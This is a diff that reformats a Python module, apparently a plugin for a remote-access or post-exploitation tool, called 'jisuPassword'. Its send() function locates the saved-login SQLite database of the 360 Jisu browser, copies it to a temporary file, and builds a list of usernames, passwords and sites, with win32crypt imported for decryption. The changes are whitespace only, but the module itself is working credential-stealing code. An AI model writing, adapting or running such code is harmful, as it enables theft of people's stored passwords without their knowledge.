@@ -1,10 +1,13 @@
-__sys__ = ["Windows"];
+__sys__ = ["Windows"]
 __name__ = "jisuPassword"
 __desc__ = "Retrieve all saved password of 360 Jisu Browser (360极速浏览器)"
+
+
 def send():
     import os, sqlite3, win32crypt, shutil
     sourceFileWithLogin = "%s\\360Chrome\\Chrome\\User Data\\Profile 1\\Login Data" % os.getenv("localappdata")
     sourceFileWithoutLogin = "%s\\360Chrome\\Chrome\\User Data\\Default\\Login Data" % os.getenv("localappdata")
+
     def get(sourceFile):
         targetFile = "%s\\TempData_360" % os.getenv("localappdata")
         result = "<Username>:<Password> (Site)\n"
@@ -23,13 +26,14 @@ def send():
         connection.close()
         os.remove(targetFile)
         return result
+
     if os.path.exists(sourceFileWithoutLogin) and \
-        len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0 and \
-        os.path.exists(sourceFileWithLogin):
+            len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0 and \
+            os.path.exists(sourceFileWithLogin):
         return get(sourceFileWithLogin)
     else:
         if os.path.exists(sourceFileWithoutLogin) and \
-            not len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0:
+                not len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0:
             return get(sourceFileWithoutLogin)
         else:
             pass
